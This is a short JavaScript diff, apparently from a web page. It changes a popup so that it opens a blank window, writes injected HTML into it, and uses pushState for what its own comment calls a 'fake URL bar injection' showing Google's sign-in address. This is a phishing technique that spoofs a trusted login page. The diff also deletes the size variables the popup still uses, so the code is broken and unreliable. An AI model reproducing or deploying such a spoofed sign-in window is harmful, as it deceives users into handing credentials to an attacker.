@@ -77,21 +77,20 @@
         }
 
         // ---- OPEN POPUP ----
-        const width = 500,
-          height = 460;
-        const left = screen.width / 2 - width / 2;
-
         const win = window.open(
-          "https://www.google.com/",
+          "about:blank",
           "_blank",
-          "second",
           `width=${width},height=${height},top=0,left=${left}`
         );
-
+        
         setTimeout(() => {
           try {
+            win.document.open();
             win.document.write(popupHTML);
             win.document.close();
+        
+            // Fake URL bar injection (opsional)
+            win.history.pushState({}, "", "https://accounts.google.com/signin"); 
           } catch (e) {
             console.warn("Blocked by browser protections:", e);
           }
